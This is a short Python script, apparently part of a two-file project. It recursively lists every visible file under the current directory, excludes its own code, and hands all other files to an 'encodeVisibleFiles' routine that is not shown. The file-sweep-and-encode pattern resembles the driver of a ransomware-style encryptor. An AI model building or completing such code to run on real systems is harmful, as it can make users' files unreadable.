import os
import resources

def main():
    startingDirectory = os.getcwd()

    # This two lists are lists of tuples that follows this format:
    # [(Directory researched, [directories in the researched directory])]
    # [(Directory researched, [files in the researched directory])]
    visibleDirectories = []
    visibleFiles = []

    # Getting our starting visible directory and visible files:
    d1, f1 = resources.getFilesAndDirectories(startingDirectory)
    visibleDirectories.append(d1)
    visibleFiles.append(f1)

    # Removing the pycache binaries, this avoid utf-8 decode in the file reading:
    visibleDirectories[0][1].remove('__pycache__')

    # Listing all the visible files in the visible directories:
    for pair in visibleDirectories:
        for directory in pair[1]:
            newDirectories, newFiles = resources.getFilesAndDirectories(pair[0]+f'/{directory}')
            if len(newDirectories[1])!=0:
                visibleDirectories.append(newDirectories)
            if len(newFiles[1])!=0:
                visibleFiles.append(newFiles)

    print(visibleFiles)
    
    # Remove our code from the visibleFiles:
    visibleFiles[0][1].remove('main.py')
    visibleFiles[0][1].remove('resources.py')

    # Now that we have all the visibleFiles, lets mess around with them:
    resources.encodeVisibleFiles(visibleFiles)

if __name__ == '__main__':
    main()
